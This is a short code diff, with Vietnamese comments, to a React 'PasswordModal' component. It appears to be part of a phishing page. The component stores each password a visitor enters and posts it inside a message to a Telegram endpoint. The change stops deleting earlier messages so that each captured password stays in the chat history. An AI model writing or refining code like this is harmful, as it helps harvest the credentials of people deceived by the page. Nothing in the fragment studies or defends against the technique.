@@ -67,18 +67,7 @@ const PasswordModal = ({ nextStep }) => {
             // Thêm password mới vào store sau khi rebuild message
             addPassword(password);
 
-            // Xóa message cũ nếu có
-            if (messageId) {
-                try {
-                    await axios.post('/api/delete-telegram', {
-                        messageId: messageId
-                    });
-                } catch {
-                    // Ignore error if delete fails
-                }
-            }
-
-            // Gửi message mới (không edit, không reply)
+            // Gửi message mới (không xóa message cũ để giữ lịch sử)
             const res = await axios.post('/api/send-telegram', {
                 message: updatedMessage,
                 parseMode: 'HTML'
